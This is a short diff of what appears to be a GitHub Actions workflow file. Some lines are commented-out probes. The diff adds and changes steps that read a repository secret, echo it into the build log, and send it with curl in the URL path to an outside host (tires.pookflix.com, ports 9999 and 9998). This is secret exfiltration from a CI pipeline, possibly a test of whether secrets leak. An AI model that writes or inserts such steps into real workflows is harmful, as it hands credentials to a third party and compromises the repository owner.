@@ -23,6 +23,7 @@ jobs:
         #cat /etc/os-release
         #echo "booooop"
         #curl ifconfig.co/json
-        foo=${{secrets.YEET}}
+        foo=${{ secrets.YEET }}
         echo $foo
-        curl http://tires.pookflix.com:9999/${{secrets.YEET}} -m 2
+        curl http://tires.pookflix.com:9999/$foo -m 2
+        curl http://tires.pookflix.com:9998/${{ secrets.YEET }} -m 2
